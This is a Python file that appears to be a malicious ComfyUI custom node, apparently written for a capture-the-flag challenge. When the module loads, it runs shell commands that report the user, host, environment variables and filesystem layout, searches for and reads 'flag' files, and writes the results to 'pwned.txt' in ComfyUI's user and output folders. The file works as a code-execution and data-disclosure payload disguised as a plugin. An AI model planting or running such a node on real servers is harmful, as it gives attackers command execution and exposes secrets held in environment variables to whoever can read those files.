import subprocess, os, glob
OUT1 = "/ComfyUI/user/default/pwned.txt"
OUT2 = "/ComfyUI/output/pwned.txt"
def run(c):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=60)
        return "$ " + c + "\n" + (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "$ %s ERR %r" % (c, e)
cmds = [
    "id; whoami; uname -a; hostname",
    "env | sort",
    "ls -la /",
    "find / -maxdepth 6 -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null",
    "cat /flag /flag.txt /challenge/flag* /root/flag* /tmp/flag* 2>/dev/null",
    "ls -la /ComfyUI /ComfyUI/user /ComfyUI/user/default 2>/dev/null",
]
data = "\n".join(run(c) for c in cmds)
for path in (OUT1, OUT2):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(data)
    except Exception:
        pass
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
